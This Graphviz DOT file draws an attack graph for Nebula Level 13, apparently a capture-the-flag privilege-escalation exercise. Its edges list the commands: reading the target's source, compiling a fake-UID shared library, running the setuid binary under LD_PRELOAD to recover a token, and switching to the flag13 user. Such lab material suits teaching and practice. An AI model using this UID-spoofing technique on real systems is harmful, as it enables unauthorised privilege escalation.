digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 13"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="UID check identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Preload library prepared"];
  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="flag13 token recovered"];
  node3 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag13 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="cat /home/flag13/flag13.c"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="gcc -fPIC -shared -o /tmp/fakeuid.so /tmp/fakeuid.c"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="LD_PRELOAD=/tmp/fakeuid.so /home/flag13/flag13"];
  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="su - flag13"];
}
